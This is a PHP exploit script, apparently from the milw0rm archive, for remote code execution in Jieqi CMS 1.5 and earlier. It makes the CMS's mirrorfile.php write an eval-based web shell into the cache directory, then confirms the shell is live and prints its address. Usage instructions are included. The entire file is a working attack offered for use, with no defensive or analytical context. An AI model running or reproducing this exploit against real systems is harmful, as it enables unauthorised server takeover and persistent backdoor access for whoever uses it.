<?php
print_r('
+---------------------------------------------------------------------------+
Jieqi cms <= 1.5 remote code execution exploit
by Securitylab.ir
mail: secu_lab_ir@yahoo.com
+---------------------------------------------------------------------------+
');
/**
* works regardless of php.ini settings
*/
if ($argc < 3) {
    print_r('
+---------------------------------------------------------------------------+
Usage: php '.$argv[0].' host path
host:      target server (ip/hostname)
path:      path to jieqi cms
Example:
php '.$argv[0].' localhost /
+---------------------------------------------------------------------------+
');
    exit;
}
error_reporting(7);
ini_set('max_execution_time', 0);
$host = $argv[1];
$path = $argv[2];
$url = 'http://'.$host.$path.'mirrorfile.php?filename=cache/seculab.php&action=writetofile&content=';
$shell = 'http://'.$host.$path.'cache/seculab.php';
$cmd = urlencode("<?php @eval(\$_POST[hamed]);?>test");
$str = file_get_contents($url.$cmd);
if ( file_get_contents($shell) == 'test')
exit("Expoilt Success!\nView Your shell:\t$shell\n");
else
exit("Exploit Failed!\n");
?>

# milw0rm.com [2009-05-18]
